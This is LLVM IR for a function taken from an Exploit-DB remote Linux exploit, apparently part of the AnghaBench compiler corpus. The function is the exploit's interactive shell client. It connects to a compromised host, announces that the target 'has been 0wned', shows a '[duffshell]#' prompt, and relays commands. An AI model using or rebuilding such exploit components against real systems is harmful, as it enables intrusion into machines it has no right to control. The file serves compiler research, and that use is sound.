; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_4312.c_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_4312.c_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_IP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [18 x i8] c"couldn't connect\0A\00", align 1
@br = common dso_local global i32 0, align 4
@SIGINT = common dso_local global i32 0, align 4
@SIG_IGN = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [30 x i8] c"\0A--< %s just has been 0wned\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"\1B[31m[duffshell]#\1B[0m \00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @shell(i8* %0, i32 %1, i64 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = bitcast %struct.sockaddr_in* %5 to i64*
  store i64 %2, i64* %12, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  %13 = bitcast %struct.sockaddr_in* %11 to i8*
  %14 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %13, i8* align 4 %14, i64 8, i1 false)
  %15 = load i32, i32* @AF_INET, align 4
  %16 = load i32, i32* @SOCK_STREAM, align 4
  %17 = load i32, i32* @IPPROTO_IP, align 4
  %18 = call i32 @socket(i32 %15, i32 %16, i32 %17)
  store i32 %18, i32* %10, align 4
  %19 = load i32, i32* @AF_INET, align 4
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i32 %19, i32* %20, align 4
  %21 = load i32, i32* %7, align 4
  %22 = call i32 @htons(i32 %21)
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i32 %22, i32* %23, align 4
  %24 = load i32, i32* %10, align 4
  %25 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %26 = call i64 @connect(i32 %24, %struct.sockaddr* %25, i32 8)
  %27 = icmp slt i64 %26, 0
  br i1 %27, label %28, label %38

28:                                               ; preds = %3
  %29 = call i32 @step(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0), i32 -1)
  %30 = load i32, i32* %10, align 4
  %31 = call i32 @close(i32 %30)
  %32 = load i32, i32* @br, align 4
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %36, label %34

34:                                               ; preds = %28
  %35 = call i32 (...) @handler()
  br label %37

36:                                               ; preds = %28
  store i32 0, i32* %4, align 4
  br label %84

37:                                               ; preds = %34
  br label %38

38:                                               ; preds = %37, %3
  %39 = load i32, i32* @SIGINT, align 4
  %40 = load i32, i32* @SIG_IGN, align 4
  %41 = call i32 @signal(i32 %39, i32 %40)
  %42 = load i32, i32* @stderr, align 4
  %43 = load i8*, i8** %6, align 8
  %44 = call i32 (i32, i8*, ...) @fprintf(i32 %42, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.1, i64 0, i64 0), i8* %43)
  br label %45

45:                                               ; preds = %83, %38
  %46 = call i32 @FD_ZERO(i32* %9)
  %47 = call i32 @FD_SET(i32 0, i32* %9)
  %48 = load i32, i32* %10, align 4
  %49 = call i32 @FD_SET(i32 %48, i32* %9)
  %50 = load i32, i32* @stderr, align 4
  %51 = call i32 (i32, i8*, ...) @fprintf(i32 %50, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  %52 = call i32 @select(i32 255, i32* %9, i32* null, i32* null, i32* null)
  %53 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %54 = call i32 @memset(i8* %53, i32 0, i32 4096)
  %55 = load i32, i32* %10, align 4
  %56 = call i64 @FD_ISSET(i32 %55, i32* %9)
  %57 = icmp ne i64 %56, 0
  br i1 %57, label %58, label %65

58:                                               ; preds = %45
  %59 = load i32, i32* %10, align 4
  %60 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %61 = call i32 @read(i32 %59, i8* %60, i32 4096)
  %62 = load i32, i32* @stderr, align 4
  %63 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %64 = call i32 (i32, i8*, ...) @fprintf(i32 %62, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %63)
  br label %65

65:                                               ; preds = %58, %45
  %66 = call i64 @FD_ISSET(i32 0, i32* %9)
  %67 = icmp ne i64 %66, 0
  br i1 %67, label %68, label %83

68:                                               ; preds = %65
  %69 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %70 = call i32 @read(i32 0, i8* %69, i32 4096)
  %71 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %72 = call i64 @strstr(i8* %71, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  %73 = icmp ne i64 %72, 0
  br i1 %73, label %74, label %77

74:                                               ; preds = %68
  %75 = load i32, i32* @stderr, align 4
  %76 = call i32 (i32, i8*, ...) @fprintf(i32 %75, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  store i32 1, i32* %4, align 4
  br label %84

77:                                               ; preds = %68
  %78 = load i32, i32* %10, align 4
  %79 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %80 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %81 = call i32 @strlen(i8* %80)
  %82 = call i32 @write(i32 %78, i8* %79, i32 %81)
  br label %83

83:                                               ; preds = %77, %65
  br label %45

84:                                               ; preds = %74, %36
  %85 = load i32, i32* %4, align 4
  ret i32 %85
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @step(i8*, i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @handler(...) #2

declare dso_local i32 @signal(i32, i32) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @FD_ZERO(i32*) #2

declare dso_local i32 @FD_SET(i32, i32*) #2

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i64 @FD_ISSET(i32, i32*) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i64 @strstr(i8*, i8*) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
